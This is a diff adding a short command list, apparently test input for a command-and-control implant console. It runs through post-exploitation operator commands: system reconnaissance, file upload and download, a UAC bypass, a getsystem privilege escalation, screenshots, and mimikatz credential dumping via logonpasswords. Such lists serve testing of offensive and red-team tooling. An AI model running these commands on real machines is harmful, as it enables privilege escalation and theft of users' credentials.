@@ -1,0 +1,19 @@
+whoami
+pwd
+cd Client
+cd ..
+ps
+shell "cmd.exe /c ipconfig /all"
+shell "cmd.exe /c whoami /groups"
+shell calc.exe
+upload 5MB.zip 5MB-new.zip
+download 5MB-new.zip
+listprivs
+setpriv SeChangeNotifyPrivilege disabled
+listprivs
+bypassuac 1 "cmd.exe"
+getsystem 1 "cmd.exe"
+screenshot
+sleep 10 40
+mimikatz "standard::version;standard::coffee"
+logonpasswords
